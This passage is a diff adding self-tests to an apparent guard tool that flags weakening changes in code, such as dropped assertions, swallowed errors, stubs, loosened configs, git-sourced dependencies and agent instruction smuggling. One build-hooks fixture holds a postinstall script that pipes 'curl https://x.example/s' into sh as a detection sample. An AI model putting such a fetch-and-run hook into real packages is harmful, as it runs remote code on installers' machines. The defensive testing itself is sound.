@@ -116,16 +116,16 @@ const CASES: &[Case] = &[
             && !line_allows("x discipline:allow(pii)", "time-estimates"))
     }),
     (
-        "config: unknown keys and planned gates are rejected",
+        "config: unknown keys and unknown gates are rejected",
         || {
             let head = "[meta]\nversion = 1\nname = \"t\"\n";
             let typo =
                 DisciplineConfig::from_toml_str(&format!("{head}[gates.pii]\nlan_ipz = false\n"));
-            let planned =
-                DisciplineConfig::from_toml_str(&format!("{head}[gates.miri]\nenabled = true\n"));
+            let unknown =
+                DisciplineConfig::from_toml_str(&format!("{head}[gates.unknown-gate]\nenabled = true\n"));
             let fine =
                 DisciplineConfig::from_toml_str(&format!("{head}[gates.pii]\nlan_ips = false\n"));
-            Ok(typo.is_err() && planned.is_err() && fine.is_ok())
+            Ok(typo.is_err() && unknown.is_err() && fine.is_ok())
         },
     ),
     (
@@ -156,6 +156,853 @@ const CASES: &[Case] = &[
             stricter.gates.pii.hostname_denylist.push("h".into());
             Ok(diff_configs(&base, &weaker)?.len() == 1
                 && diff_configs(&base, &stricter)?.is_empty())
+        },
+    ),
+    (
+        "integrity: switching to advisory mode is a weakening, leaving it is not",
+        || {
+            let enforcing = DisciplineConfig::default_for_repo("t");
+            let mut advisory = enforcing.clone();
+            advisory.meta.mode = crate::config::RunMode::Advisory;
+            let found = diff_configs(&enforcing, &advisory)?;
+            Ok(found.len() == 1
+                && found[0].gate == "meta"
+                && diff_configs(&advisory, &enforcing)?.is_empty())
+        },
+    ),
+    (
+        "integrity: a lowered floor or raised cap is a weakening, the reverse is not",
+        || {
+            let mut base = DisciplineConfig::default_for_repo("t");
+            base.gates.test_floor.min_tests = Some(40);
+            base.gates.suppression_delta.max_increase = 2;
+            let mut weaker = base.clone();
+            weaker.gates.test_floor.min_tests = Some(3);
+            weaker.gates.suppression_delta.max_increase = 9;
+            Ok(diff_configs(&base, &weaker)?.len() == 2
+                && diff_configs(&weaker, &base)?.is_empty())
+        },
+    ),
+    (
+        "overrides: a listed reviewer approves, the author and a stale approval do not",
+        || {
+            use crate::config::DirectivesConfig;
+            use crate::forge::{CannedApi, Forge, ForgeKind};
+            use crate::override_policy::{judge, PullContext};
+            let cfg = DirectivesConfig {
+                require_approval: true,
+                allowed_override_actors: vec!["lead".into(), "agent".into()],
+                ..Default::default()
+            };
+            let pull = PullContext {
+                number: 7,
+                author: "agent".into(),
+                head_sha: "abc123".into(),
+            };
+            let forge = || {
+                Ok(Forge {
+                    kind: ForgeKind::GitHub,
+                    url: "https://github.com".into(),
+                    repo: "o/r".into(),
+                })
+            };
+            let refused = |login: &str, sha: &str| -> Result<bool> {
+                let mut api = CannedApi::default();
+                api.responses.insert(
+                    "github:repos/o/r/pulls/7/reviews?per_page=100".into(),
+                    serde_json::json!([{"user": {"login": login}, "state": "APPROVED", "commit_id": sha}]),
+                );
+                Ok(!judge(&cfg, 1, Some(&pull), &forge, &api)?.is_empty())
+            };
+            Ok(!refused("lead", "abc123")?
+                && refused("agent", "abc123")?
+                && refused("lead", "0ld5ha")?)
+        },
+    ),
+    (
+        "overrides: the budget refuses the override past it, not the one at it",
+        || {
+            use crate::config::DirectivesConfig;
+            use crate::forge::NoApi;
+            use crate::override_policy::judge;
+            let cfg = DirectivesConfig {
+                max_overrides: Some(2),
+                ..Default::default()
+            };
+            let forge = || Err("unused".to_string());
+            Ok(judge(&cfg, 2, None, &forge, &NoApi)?.is_empty()
+                && judge(&cfg, 3, None, &forge, &NoApi)?.len() == 1)
+        },
+    ),
+    (
+        "ci-integrity: a GitLab job gaining allow_failure is a weakening, one that had it is not",
+        || {
+            use crate::guards::ci_gitlab::diff_gitlab_ci;
+            let strict = "unit-tests:\n  script:\n    - cargo test\n";
+            let lax = "unit-tests:\n  script:\n    - cargo test\n  allow_failure: true\n";
+            let found = |b: &str, h: &str| diff_gitlab_ci(b, h).map_err(anyhow::Error::msg);
+            Ok(found(strict, lax)?.len() == 1
+                && found(lax, lax)?.is_empty()
+                && found(lax, strict)?.is_empty())
+        },
+    ),
+    (
+        "dependency-delta: a lockfile entry moved to git is reported, a new registry entry is not",
+        || {
+            use crate::guards::lockfile::{diff_lock, parse_lock};
+            let reg = "source = \"registry+https://github.com/rust-lang/crates.io-index\"\nchecksum = \"aa\"\n";
+            let pkg = |name: &str, src: &str| format!("[[package]]\nname = \"{name}\"\nversion = \"1.0.0\"\n{src}\n");
+            let parse = |c: &str| parse_lock("Cargo.lock", c).ok_or_else(|| anyhow::anyhow!("unparsed"));
+            let base = parse(&pkg("serde", reg))?;
+            let grown = parse(&format!("{}{}", pkg("serde", reg), pkg("anyhow", reg)))?;
+            let forked = parse(&pkg("serde", "source = \"git+https://github.com/someone/serde#def\"\n"))?;
+            Ok(diff_lock(&base, &grown).is_empty() && diff_lock(&base, &forked).len() == 2)
+        },
+    ),
+    (
+        "toolchain-config: strict switched off is a weakening, switched on is not",
+        || {
+            use crate::guards::toolchain_config::{classify, diff_trees, load, Classified};
+            let Some(Classified::Data { name, rules }) = classify("tsconfig.json") else {
+                anyhow::bail!("tsconfig.json not classified");
+            };
+            let on = load(&name, "{\"compilerOptions\": {\"strict\": true}}")
+                .ok_or_else(|| anyhow::anyhow!("unparsed"))?;
+            let off = load(&name, "{\"compilerOptions\": {\"strict\": false}}")
+                .ok_or_else(|| anyhow::anyhow!("unparsed"))?;
+            Ok(diff_trees(&on, &off, &rules).len() == 1 && diff_trees(&off, &on, &rules).is_empty())
+        },
+    ),
+    (
+        "suppression-delta: a moved suppression is not new, an added one is",
+        || {
+            use crate::guards::suppression_delta::new_sites;
+            let v = AssertVocabulary::default();
+            let facts = |src: &str| analyze(src, &v).map(|f| f.escape_hatches);
+            let base = facts("#[allow(dead_code)]\nfn a() {}\nfn b() {}\n")?;
+            let moved = facts("fn b() {}\n#[allow(dead_code)]\nfn a() {}\n")?;
+            let added = facts("#[allow(dead_code)]\nfn a() {}\n#[allow(unused)]\nfn b() {}\n")?;
+            let sites = |h: &[crate::ast::EscapeHatchSite]| crate::guards::suppression_delta::sites_of(h);
+            Ok(new_sites(&sites(&base), &sites(&moved)).is_empty()
+                && new_sites(&sites(&base), &sites(&added)).len() == 1)
+        },
+    ),
+    (
+        "stub-bodies: a body replaced by todo!() is reported, a body given to a stub is not",
+        || {
+            use crate::guards::stub_bodies::judge;
+            let v = AssertVocabulary::default();
+            let real = analyze("pub fn f(x: u8) -> u8 { x + 1 }", &v)?.functions;
+            let stub = analyze("pub fn f(x: u8) -> u8 { todo!() }", &v)?.functions;
+            Ok(judge(&real, &stub).len() == 1 && judge(&stub, &real).is_empty())
+        },
+    ),
+    (
+        "mocks: an interaction check counts as a mock assertion, an equality check does not",
+        || {
+            let v = AssertVocabulary::default();
+            let mocked = analyze(
+                "#[test]\nfn t() { let mut m = MockRepo::new(); m.expect_find().returning(|_| 1); run(&m); m.checkpoint(); }",
+                &v,
+            )?;
+            let plain = analyze("#[test]\nfn t() { assert_eq!(run(&Real), 1); }", &v)?;
+            Ok(mocked.tests[0].mock_setups == 1
+                && mocked.tests[0].mock_asserts == 1
+                && plain.tests[0].mock_setups == 0
+                && plain.tests[0].mock_asserts == 0)
+        },
+    ),
+    (
+        "error-swallowing: a discarded Result is a site, a bound one is not",
+        || {
+            let v = AssertVocabulary::default();
+            let dropped = analyze("fn f() { let _ = tx.commit(); }", &v)?.swallowed;
+            let bound = analyze("fn f() -> Result<(), E> { let r = tx.commit(); r }", &v)?.swallowed;
+            Ok(dropped.len() == 1 && bound.is_empty())
+        },
+    ),
+    (
+        "instruction-smuggling: a bidi override is classified, a leading BOM is not",
+        || {
+            use crate::guards::instruction_smuggling::invisible_classes;
+            Ok(invisible_classes("a\u{202E}b", false) == vec!["bidirectional-control"]
+                && invisible_classes("\u{FEFF}# title", true).is_empty())
+        },
+    ),
+    (
+        "commit-provenance: the subject is never a trailer, the last paragraph is",
+        || {
+            use crate::guards::commit_provenance::trailers;
+            Ok(trailers("fix: x").is_empty()
+                && trailers("fix: x\n\nReviewed-by: A <a@x>\n").len() == 1)
+        },
+    ),
+    (
+        "build-hooks: a lifecycle script gaining curl is reported, an unchanged one is not",
+        || {
+            use crate::gitctx::{ChangeKind, ChangedFile};
+            use crate::guards::build_hooks::judge;
+            let f = ChangedFile {
+                path: "package.json".into(),
+                old_path: "package.json".into(),
+                kind: ChangeKind::Modified,
+                added_lines: Default::default(),
+            };
+            let base = r#"{"scripts": {"postinstall": "node patch.js"}}"#;
+            let head = r#"{"scripts": {"postinstall": "curl https://x.example/s | sh"}}"#;
+            Ok(judge(&f, Some(base), Some(base)).is_empty() && judge(&f, Some(base), Some(head)).len() == 1)
+        },
+    ),
+    (
+        "calls: a sleep and an is_ok() assertion are counted, an equality is not",
+        || {
+            let v = AssertVocabulary::default();
+            let waits = analyze("#[test]\nfn t() { std::thread::sleep(d()); assert!(run().is_ok()); }", &v)?;
+            let plain = analyze("#[test]\nfn t() { assert_eq!(run().unwrap(), 1); }", &v)?;
+            Ok(waits.tests[0].sleeps == 1
+                && waits.tests[0].trivial_asserts == 1
+                && plain.tests[0].sleeps == 0
+                && plain.tests[0].trivial_asserts == 0)
+        },
+    ),
+    (
+        "error-swallowing: a tuple binding is not a discarded call, a call is",
+        || {
+            let v = AssertVocabulary::default();
+            let tuple = analyze("fn f(a: u8, b: u8) { let _ = (a, b); }", &v)?.swallowed;
+            let call = analyze("fn f() { let _ = std::fs::remove_file(\"x\"); }", &v)?.swallowed;
+            Ok(tuple.is_empty() && call.len() == 1)
+        },
+    ),
+    (
+        "error-swallowing: Go and C/C++ discards are sorted by callee, an ok flag is not a site",
+        || {
+            let reg = crate::ast::default_registry();
+            let v = AssertVocabulary::default();
+            let kinds = |path: &str, src: &str| -> Result<Vec<&'static str>> {
+                let Some(pack) = reg.find_pack(path) else {
+                    return Ok(vec!["skipped"]);
+                };
+                Ok(pack.extract(path, src, &v)?.swallowed.iter().map(|s| s.kind).collect())
+            };
+            let go = kinds(
+                "pkg/a.go",
+                "package a\nfunc F() {\n\tn, _ := w.Close()\n\tv, _ := m.Load(k)\n\tt, _ := x.(int)\n}\n",
+            )?;
+            let c = kinds("src/a.c", "void f(void) {\n    (void)fsync(fd);\n    (void)g();\n}\n")?;
+            Ok((go == ["discarded-result"] || go == ["skipped"])
+                && (c == ["discarded-result", "discarded-value"] || c == ["skipped"]))
+        },
+    ),
+    #[cfg(feature = "lang-objc")]
+    (
+        "objc: XCTest methods, a vacuous one, a skip, an error:nil and a stub",
+        || {
+            use crate::ast::LanguagePack;
+            let pack = crate::ast::objc::ObjcPack;
+            let v = AssertVocabulary::default();
+            let t = pack.extract(
+                "AppTests/ATests.m",
+                "@interface ATests : XCTestCase\n@end\n@implementation ATests\n- (void)testA { XCTAssertEqual(f(), 1); }\n- (void)testB { }\n- (void)testC { XCTSkipIf(YES); }\n@end\n",
+                &v,
+            )?;
+            let p = pack.extract(
+                "App/A.m",
+                "@implementation A\n- (void)save { [d writeToFile:p options:0 error:nil]; }\n- (void)load { [self doesNotRecognizeSelector:_cmd]; }\n@end\n",
+                &v,
+            )?;
+            Ok(t.tests.len() == 3
+                && t.tests[0].strong_asserts == 1
+                && t.tests[1].is_vacuous()
+                && t.tests[2].ignored
+                && p.swallowed.len() == 1
+                && p.functions.iter().any(|x| x.name == "load" && matches!(x.shape, crate::ast::functions::BodyShape::Stub(_))))
+        },
+    ),
+    #[cfg(feature = "lang-scala")]
+    (
+        "scala: FunSuite and FlatSpec tests, a skip, an empty catch arm and a ??? stub",
+        || {
+            use crate::ast::LanguagePack;
+            let pack = crate::ast::scala::ScalaPack;
+            let v = AssertVocabulary::default();
+            let t = pack.extract(
+                "src/test/scala/ASuite.scala",
+                "class ASuite extends AnyFunSuite {\n  test(\"a\") { assertEquals(f(), 1) }\n  test(\"b\") { }\n  ignore(\"c\") { assert(g() == 2) }\n  \"A\" should \"d\" in { assert(h() == 3) }\n}\n",
+                &v,
+            )?;
+            let p = pack.extract(
+                "src/main/scala/A.scala",
+                "object A {\n  def f(): Unit = { try { g() } catch { case _: Exception => } }\n  def s(): Int = ???\n}\n",
+                &v,
+            )?;
+            Ok(t.tests.len() == 4
+                && t.tests[0].strong_asserts == 1
+                && t.tests[1].is_vacuous()
+                && t.tests[2].ignored
+                && t.tests[3].strong_asserts == 1
+                && p.swallowed.len() == 1
+                && p.functions.iter().any(|x| x.name == "s" && matches!(x.shape, crate::ast::functions::BodyShape::Stub(_))))
+        },
+    ),
+    #[cfg(feature = "lang-swift")]
+    (
+        "swift: XCTest and Swift Testing tests, a vacuous one, a skip and a discarded try?",
+        || {
+            use crate::ast::LanguagePack;
+            let pack = crate::ast::swift::SwiftPack;
+            let v = AssertVocabulary::default();
+            let f = pack.extract(
+                "Tests/ATests.swift",
+                "final class ATests: XCTestCase {\n  func testA() { XCTAssertEqual(f(), 1) }\n  func testB() {}\n  func testC() throws { throw XCTSkip(\"x\") }\n}\n@Test func d() { #expect(g() == 2) }\n",
+                &v,
+            )?;
+            let prod = pack.extract("Sources/A.swift", "func h() { try? save() }\n", &v)?;
+            let names: Vec<&str> = f.tests.iter().map(|t| t.name.as_str()).collect();
+            Ok(names == ["ATests.testA", "ATests.testB", "ATests.testC", "d"]
+                && f.tests[0].strong_asserts == 1
+                && f.tests[1].is_vacuous()
+                && f.tests[2].ignored
+                && f.tests[3].strong_asserts == 1
+                && prod.swallowed.iter().any(|s| s.kind == "discarded-result"))
+        },
+    ),
+    (
+        "dispatch tables: helpers named in an array a test loops over resolve like calls",
+        || {
+            let reg = crate::ast::default_registry();
+            let v = AssertVocabulary::default();
+            let Some(pack) = reg.find_pack("tests/t.rs") else {
+                return Ok(true);
+            };
+            let t = pack
+                .extract(
+                    "tests/t.rs",
+                    "fn check_a() { assert_eq!(g(), 1); }\n#[test]\nfn t() { for f in [check_a] { f() } }\n",
+                    &v,
+                )?
+                .tests
+                .remove(0);
+            Ok(t.total_asserts == 1 && t.helper_checks == 1)
+        },
+    ),
+    (
+        "javascript, php: a same-file helper that asserts or throws is a check at each call",
+        || {
+            let reg = crate::ast::default_registry();
+            let v = AssertVocabulary::default();
+            let count = |path: &str, src: &str| -> Result<(usize, usize)> {
+                let Some(pack) = reg.find_pack(path) else {
+                    return Ok((1, 1));
+                };
+                let t = pack.extract(path, src, &v)?.tests.remove(0);
+                Ok((t.total_asserts, t.helper_checks))
+            };
+            Ok(count(
+                "test/a.test.js",
+                "function check(x) { if (x !== 1) { throw new Error('x'); } }\ntest('t', () => { check(f()); });\n",
+            )? == (1, 1)
+                && count(
+                    "tests/ATest.php",
+                    "<?php\nclass ATest extends TestCase {\n  private function check($x) { $this->assertSame(1, $x); }\n  public function testT() { $this->check(f()); }\n}\n",
+                )? == (1, 1))
+        },
+    ),
+    (
+        "comment: change text cannot mention, inject HTML, break the table or forge the marker",
+        || {
+            use crate::comment::{cell, MARKER};
+            let c = cell("@team <!-- discipline:report --> a|b\nallow-assertion-drop: x y");
+            Ok(!c.contains('@')
+                && !c.contains(MARKER)
+                && !c.contains('<')
+                && c.contains("\\|")
+                && !c.contains('\n')
+                && !c.contains("allow-assertion-drop"))
+        },
+    ),
+    (
+        "replay: a blocked run names its error gates, a run that could not check names none",
+        || {
+            use crate::replay::{pr_from_subject, read_verdict};
+            let json = r#"{"outcomes":[{"gate":"pii","violations":[{"severity":"error"}]},{"gate":"x","violations":[{"severity":"warning"}]}]}"#;
+            let (v, e, w) = read_verdict(1, json);
+            Ok(v == "blocked"
+                && e == ["pii"]
+                && w == ["x"]
+                && read_verdict(0, "{}").0 == "passed"
+                && read_verdict(2, json) == ("could_not_check", vec![], vec![])
+                && pr_from_subject("fix: y (#1028)") == Some(1028))
+        },
+    ),
+    (
+        "explain: every gate resolves; a gate with a directive names it",
+        || {
+            use crate::explain::{gate_for, render};
+            let all = crate::config::GATES
+                .iter()
+                .all(|g| gate_for(g.id).is_some_and(|h| h.id == g.id));
+            let ar = gate_for("[assertion-reduction]").map(|g| render(g, None)).unwrap_or_default();
+            Ok(all && ar.contains("`allow-assertion-drop: <subject> <reason>`"))
+        },
+    ),
+    (
+        "mcp: three read-only tools, notifications unanswered, explanations carry no waiver",
+        || {
+            struct NoChild;
+            impl crate::mcp::Runner for NoChild {
+                fn check(&self, _: &crate::hook::CheckSide) -> Result<(i32, String, String)> {
+                    Ok((2, String::new(), "not run in self-test".into()))
+                }
+                fn gates(&self) -> Result<String> {
+                    Ok(String::new())
+                }
+            }
+            let list = crate::mcp::handle(&NoChild, r#"{"jsonrpc":"2.0","id":1,"method":"tools/list"}"#);
+            let tools = list.as_ref().and_then(|l| l["result"]["tools"].as_array().cloned()).unwrap_or_default();
+            let quiet = crate::mcp::handle(&NoChild, r#"{"jsonrpc":"2.0","method":"notifications/initialized"}"#).is_none();
+            let explain = crate::mcp::handle(
+                &NoChild,
+                r#"{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"explain_finding","arguments":{"query":"error-swallowing"}}}"#,
+            )
+            .map(|r| r.to_string())
+            .unwrap_or_default();
+            let broken = crate::mcp::handle(
+                &NoChild,
+                r#"{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"check_diff","arguments":{}}}"#,
+            );
+            Ok(tools.len() == 3
+                && tools.iter().all(|t| t["annotations"]["readOnlyHint"] == true)
+                && quiet
+                && explain.contains("error-swallowing")
+                && !explain.contains("allow-swallow")
+                && broken.is_some_and(|b| b["result"]["isError"] == true))
+        },
+    ),
+    (
+        "instruction-smuggling: every hook file `hook install` writes is an agent-instruction file",
+        || {
+            use crate::guards::instruction_smuggling::is_instruction_file;
+            Ok([
+                ".claude/settings.json",
+                ".codex/hooks.json",
+                ".cursor/hooks.json",
+                ".aider.conf.yml",
+                ".github/hooks/discipline.json",
+                ".agents/hooks.json",
+                ".qwen/settings.json",
+                ".opencode/plugins/discipline.js",
+            ]
+            .iter()
+            .all(|f| is_instruction_file(f))
+                && !is_instruction_file(".github/workflows/ci.yml"))
+        },
+    ),
+    (
+        "hook: findings block in each agent's contract, and a check that cannot run blocks too",
+        || {
+            use crate::hook::{translate, translate_event, Agent, Event};
+            let r = "### Issue 1 [assertion-reduction]: x\n";
+            let cc = translate(Agent::ClaudeCode, 1, r, "");
+            let cursor = translate(Agent::Cursor, 1, r, "");
+            Ok(cc.code == 2
+                && cc.stderr == r
+                && translate(Agent::Codex, 1, r, "").code == 2
+                && cursor.code == 0
+                && cursor.stdout.contains("followup_message")
+                && translate(Agent::Aider, 1, r, "").code == 1
+                && translate(Agent::ClaudeCode, 0, "", "").code == 0
+                && translate(Agent::ClaudeCode, 2, "", "boom").code == 2
+                && translate_event(Agent::Copilot, Event::Stop, 1, r, "").stdout.contains("\"block\"")
+                && translate_event(Agent::Copilot, Event::Edit, 1, r, "").stdout.contains("additionalContext")
+                && translate_event(Agent::Agy, Event::Stop, 1, r, "").stdout.contains("\"continue\"")
+                && translate(Agent::Qwen, 1, r, "").code == 2)
+        },
+    ),
+    (
+        "error-swallowing: a Rust discard is sorted by callee, an accessor is not a site",
+        || {
+            let v = AssertVocabulary::default();
+            let kinds = |src: &str| -> Result<Vec<&'static str>> {
+                Ok(analyze(src, &v)?.swallowed.iter().map(|s| s.kind).collect())
+            };
+            Ok(kinds("fn f(&self) { let _ = self.shards.get_or_init(|| build()); }")?.is_empty()
+                && kinds("fn f() { let _ = file.sync_all(); }")? == ["discarded-result"]
+                && kinds("fn f() { let _ = writeln!(w, \"x\"); }")? == ["discarded-result"]
+                && kinds("fn f() { let _ = self.lookup(k); }")? == ["discarded-value"])
+        },
+    ),
+    (
+        "assertion-reduction: checks moved into a raising helper (called or in a dispatch table) are a refactor, a deleted call is a drop",
+        || {
+            use crate::guards::agent_diff::{evaluate_assertion_reduction, TestPair};
+            let v = AssertVocabulary {
+                test_functions: vec!["self_test".into()],
+                ..Default::default()
+            };
+            let py = crate::ast::default_registry();
+            let Some(pack) = py.find_pack("s.py") else {
+                return Ok(true);
+            };
+            let inline = "def self_test():\n    assert a == 1\n    assert b == 2\n    assert c == 3\n";
+            let moved = "def check(d, want):\n    for k, w in want.items():\n        if d.get(k) != w:\n            raise ValueError(k)\n\ndef self_test():\n    check(d, want)\n";
+            let deleted = "def check(d, want):\n    for k, w in want.items():\n        if d.get(k) != w:\n            raise ValueError(k)\n\ndef self_test():\n    pass\n";
+            let t = |src: &str| -> Result<crate::ast::TestFn> {
+                Ok(pack.extract("s.py", src, &v)?.tests.remove(0))
+            };
+            let (inline, moved, deleted) = (t(inline)?, t(moved)?, t(deleted)?);
+            let settings = crate::config::AssertionGate::default();
+            let run = |b, h| {
+                evaluate_assertion_reduction(
+                    &[TestPair { path: "s.py", base: b, head: h, forced: false }],
+                    &[],
+                    &settings,
+                    &[],
+                    false,
+                )
+            };
+            let table = t("def check(d, want):\n    for k, w in want.items():\n        if d.get(k) != w:\n            raise ValueError(k)\n\ndef self_test():\n    for _, fn in [(\"check\", check)]:\n        fn()\n")?;
+            Ok(run(&inline, &moved)?.violations.is_empty()
+                && run(&moved, &deleted)?.violations.len() == 1
+                && table.helper_checks == 1)
+        },
+    ),
+    (
+        "error-swallowing: PHP `@call()` and Ruby `call rescue nil` are silenced errors, a fallback is not",
+        || {
+            use crate::ast::default_registry;
+            let v = AssertVocabulary::default();
+            let reg = default_registry();
+            let php = reg
+                .find_pack("src/a.php")
+                .ok_or_else(|| anyhow::anyhow!("no php pack"))?
+                .extract("src/a.php", "<?php\nfunction f($p) { $x = @g($p); return $x; }\n", &v)?
+                .swallowed;
+            let rb_pack = reg
+                .find_pack("lib/a.rb")
+                .ok_or_else(|| anyhow::anyhow!("no ruby pack"))?;
+            let nil = rb_pack.extract("lib/a.rb", "def f(p)\n  g(p) rescue nil\nend\n", &v)?.swallowed;
+            let fallback = rb_pack
+                .extract("lib/a.rb", "def f(p)\n  g(p) rescue h(p)\nend\n", &v)?
+                .swallowed;
+            Ok(php.len() == 1
+                && php[0].kind == "silenced-error"
+                && nil.len() == 1
+                && nil[0].kind == "silenced-error"
+                && fallback.is_empty())
+        },
+    ),
+    (
+        "error-swallowing: a PHP `@call()` whose result is tested reads the failure, `?:` does not",
+        || {
+            use crate::ast::default_registry;
+            let v = AssertVocabulary::default();
+            let reg = default_registry();
+            let pack = reg
+                .find_pack("scripts/a.php")
+                .ok_or_else(|| anyhow::anyhow!("no php pack"))?;
+            let src = "<?php\nif (!@chdir($d)) { exit(2); }\nif (@file_get_contents($f) === false) { exit(1); }\n$n = @filesize($f) ?: 0;\n";
+            let lines: Vec<usize> = pack
+                .extract("scripts/a.php", src, &v)?
+                .swallowed
+                .iter()
+                .map(|s| s.line)
+                .collect();
+            Ok(lines == vec![4])
+        },
+    ),
+    (
+        "vacuous-tests: a PHP top-level `test*` function outside a test path is not a test",
+        || {
+            use crate::ast::default_registry;
+            let v = AssertVocabulary::default();
+            let reg = default_registry();
+            let pack = reg
+                .find_pack("examples/a.php")
+                .ok_or_else(|| anyhow::anyhow!("no php pack"))?;
+            let src = "<?php\nfunction testsCovering(array $c): array { return $c; }\n";
+            Ok(pack.extract("examples/a.php", src, &v)?.tests.is_empty()
+                && pack.extract("tests/a.php", src, &v)?.tests.len() == 1)
+        },
+    ),
+    (
+        "c pack: a PHP extension's macro head and parameter block parse, the discard inside is read",
+        || {
+            use crate::ast::default_registry;
+            let v = AssertVocabulary::default();
+            let reg = default_registry();
+            let pack = reg
+                .find_pack("ext/a.c")
+                .ok_or_else(|| anyhow::anyhow!("no c pack"))?;
+            let src = "PHP_METHOD(Judy, clear)\n{\n\tZEND_PARSE_PARAMETERS_START(1, 1)\n\t\tZ_PARAM_ZVAL(z)\n\tZEND_PARSE_PARAMETERS_END();\n\t(void)zend_hash_clean(h);\n}\n";
+            let facts = pack.extract("ext/a.c", src, &v)?;
+            Ok(facts.skipped_error_nodes_count == 0
+                && facts.swallowed.iter().map(|s| s.line).collect::<Vec<_>>() == vec![6]
+                && facts.functions.iter().any(|f| f.name == "Judy_clear" && f.line == 1))
+        },
+    ),
+    (
+        "ignored-tests: a Go `t.Skip` under `if testing.Short()` is conditional, a bare one is ignored",
+        || {
+            use crate::ast::default_registry;
+            let v = AssertVocabulary::default();
+            let reg = default_registry();
+            let pack = reg
+                .find_pack("p_test.go")
+                .ok_or_else(|| anyhow::anyhow!("no go pack"))?;
+            let src = "package p\n\nimport \"testing\"\n\nfunc TestA(t *testing.T) {\n\tif testing.Short() {\n\t\tt.Skip()\n\t}\n}\n\nfunc TestB(t *testing.T) {\n\tt.Skip()\n}\n";
+            let tests = pack.extract("p_test.go", src, &v)?.tests;
+            let a = tests.iter().find(|t| t.name == "TestA");
+            let b = tests.iter().find(|t| t.name == "TestB");
+            Ok(a.is_some_and(|t| !t.ignored && t.conditional_ignore.is_some())
+                && b.is_some_and(|t| t.ignored && t.conditional_ignore.is_none()))
+        },
+    ),
+    (
+        "instruction-smuggling: `instruction_files` parses, defaults empty, and dropping an entry is a weakening",
+        || {
+            use crate::guards::integrity::{direction_of, Direction};
+            let declared: crate::config::DisciplineConfig = toml::from_str(
+                "[gates.instruction-smuggling]\ninstruction_files = [\"CONTEXT.md\"]\n",
+            )?;
+            Ok(declared.gates.instruction_smuggling.instruction_files == ["CONTEXT.md"]
+                && crate::config::Gates::default()
+                    .instruction_smuggling
+                    .instruction_files
+                    .is_empty()
+                && direction_of("instruction_files") == Some(Direction::Shrunk))
+        },
+    ),
+    (
+        "assertion-reduction: a Python bound moved from 1.5 to 5.0 is loosened, back to 1.5 is not",
+        || {
+            use crate::ast::bounds::loosened;
+            use crate::ast::default_registry;
+            let v = AssertVocabulary::default();
+            let reg = default_registry();
+            let pack = reg
+                .find_pack("tests/test_t.py")
+                .ok_or_else(|| anyhow::anyhow!("no python pack"))?;
+            let at = |n: &str| -> anyhow::Result<Vec<crate::ast::bounds::Bound>> {
+                let src = format!("def test_t():\n    assert d < {n}\n");
+                Ok(pack.extract("tests/test_t.py", &src, &v)?.tests[0].bounds.clone())
+            };
+            let (tight, loose) = (at("1.5")?, at("5.0")?);
+            Ok(loosened(&tight, &loose).len() == 1 && loosened(&loose, &tight).is_empty())
+        },
+    ),
+    (
+        "error-swallowing: a Python handler for SystemExit or KeyboardInterrupt alone is not a site",
+        || {
+            use crate::ast::default_registry;
+            let v = AssertVocabulary::default();
+            let reg = default_registry();
+            let pack = reg
+                .find_pack("pkg/a.py")
+                .ok_or_else(|| anyhow::anyhow!("no python pack"))?;
+            let src = "def f():\n    try:\n        g()\n    except KeyboardInterrupt:\n        pass\n    try:\n        g()\n    except (KeyboardInterrupt, OSError):\n        pass\n";
+            let lines: Vec<usize> = pack
+                .extract("pkg/a.py", src, &v)?
+                .swallowed
+                .iter()
+                .map(|s| s.line)
+                .collect();
+            Ok(lines == vec![8])
+        },
+    ),
+    (
+        "assertion-reduction: a C++ test's checks two helper calls down still count, a C header's extern \"C\" guard parses",
+        || {
+            use crate::ast::default_registry;
+            let v = AssertVocabulary::default();
+            let reg = default_registry();
+            let cpp = reg
+                .find_pack("tests/t.cc")
+                .ok_or_else(|| anyhow::anyhow!("no c++ pack"))?;
+            let src = "void Require(bool c) { if (!c) std::abort(); }\nvoid CheckA() { Require(f()); Require(g()); }\nint main() { CheckA(); return 0; }\n";
+            let t = &cpp.extract("tests/t.cc", src, &v)?.tests[0];
+            let c = reg
+                .find_pack("include/x.h")
+                .ok_or_else(|| anyhow::anyhow!("no c pack"))?;
+            let header = "#ifdef __cplusplus\nextern \"C\" {\n#endif\nint f(void);\n#ifdef __cplusplus\n}\n#endif\n";
+            let h = c.extract("include/x.h", header, &v)?;
+            Ok(t.total_asserts == 2 && t.fatal_asserts == 2 && h.skipped_error_nodes_count == 0)
+        },
+    ),
+    (
+        "error-swallowing: a Python loop skipping an unparseable line is skipped input, a swallowed OSError is not",
+        || {
+            use crate::ast::default_registry;
+            let v = AssertVocabulary::default();
+            let reg = default_registry();
+            let pack = reg
+                .find_pack("scripts/p.py")
+                .ok_or_else(|| anyhow::anyhow!("no python pack"))?;
+            let src = "def rows(lines):\n    for line in lines:\n        try:\n            yield json.loads(line)\n        except json.JSONDecodeError:\n            continue\n    try:\n        open('x')\n    except OSError:\n        pass\n";
+            let kinds: Vec<&str> = pack
+                .extract("scripts/p.py", src, &v)?
+                .swallowed
+                .iter()
+                .map(|s| s.kind)
+                .collect();
+            Ok(kinds == vec!["skipped-input", "empty-handler"])
+        },
+    ),
+    (
+        "assertion-reduction: a C++ main running its tests from a table counts their checks; a declared _self_test is a test",
+        || {
+            use crate::ast::default_registry;
+            let reg = default_registry();
+            let cpp = reg
+                .find_pack("tests/t.cc")
+                .ok_or_else(|| anyhow::anyhow!("no c++ pack"))?;
+            let src = "void TestA() { assert(a()); assert(b()); }\nint main() {\n  const std::vector<std::pair<std::string, void (*)()>> tests = {{\"a\", TestA}};\n  for (const auto& t : tests) t.second();\n  return 0;\n}\n";
+            let table = cpp.extract("tests/t.cc", src, &AssertVocabulary::default())?.tests[0].total_asserts;
+            let py = reg
+                .find_pack("scripts/g.py")
+                .ok_or_else(|| anyhow::anyhow!("no python pack"))?;
+            let vocab = AssertVocabulary {
+                test_functions: vec!["_self_test".into()],
+                ..Default::default()
+            };
+            let tests = py.extract("scripts/g.py", "def _self_test():\n    return 0\n", &vocab)?.tests;
+            Ok(table == 2 && tests.len() == 1)
+        },
+    ),
+    (
+        "stub-bodies: a C function's name is read through its declarator, a `(void)` call is discarded",
+        || {
+            use crate::ast::default_registry;
+            use crate::ast::functions::BodyShape;
+            let v = AssertVocabulary::default();
+            let reg = default_registry();
+            let facts = reg
+                .find_pack("src/a.c")
+                .ok_or_else(|| anyhow::anyhow!("no c pack"))?
+                .extract(
+                    "src/a.c",
